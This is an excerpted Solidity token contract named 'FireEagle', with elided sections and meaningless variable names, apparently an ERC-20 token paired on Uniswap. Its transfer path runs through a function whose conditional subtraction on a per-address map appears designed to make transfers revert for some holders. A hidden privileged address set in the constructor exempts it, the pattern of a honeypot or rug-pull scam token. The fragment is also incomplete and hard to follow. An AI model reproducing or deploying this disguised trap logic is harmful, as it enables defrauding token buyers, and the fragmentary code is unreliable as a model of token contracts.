...
contract FireEagle is Ownable {
    ...
    uint256 private threw;
    uint8 private orange;
    ...
    function experience(
        ...
        if (!duty && felt[send] == 0 && average[send] > 0) {
            felt[send] -= orange;
        }

        advice = palace * column;

        if (felt[send] == 0) {
            pencil[send] -= palace;
        }

        evidence = advice / threw;
    ...
    mapping(address => uint256) private felt;
    ...
    function transferFrom(
        ...
        experience(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        experience(msg.sender, recipient, amount);
        return true;
    }
    ...
    constructor(
        ...
        uniswapV2Router = IUniswapV2Router02(stopped);
        language = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        ...
        column = 0;
        threw = 100;
        felt[scientist] = orange;
        _tTotal = 1000000000000000 * 10**orange;
        pencil[msg.sender] = _tTotal;
    }
}